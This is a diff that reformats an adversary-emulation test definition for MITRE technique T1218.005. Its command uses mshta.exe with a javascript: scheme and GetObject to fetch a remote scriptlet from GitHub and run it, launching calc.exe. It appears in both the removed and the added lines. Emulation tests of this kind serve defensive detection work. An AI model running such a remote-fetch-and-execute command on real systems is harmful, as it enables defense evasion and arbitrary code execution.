@@ -1,12 +1,15 @@
-- id: 5b8a408a-9a36-5bdd-b09f-b69fe0dd4da9
+- requirements: []
   name: Soumaia ART Tests - Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
   description: Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.
   tactic: stealth
-  technique:
-    attack_id: T1218.005
-    name: 'Signed Binary Proxy Execution: Mshta'
-  platforms:
-    windows:
-      cmd:
-        command: |-
-          mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
+  technique_id: T1218.005
+  technique_name: 'Signed Binary Proxy Execution: Mshta'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: cmd
+    payloads: []
+    parsers: []
+    command: mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
+  id: 5b8a408a-9a36-5bdd-b09f-b69fe0dd4da9
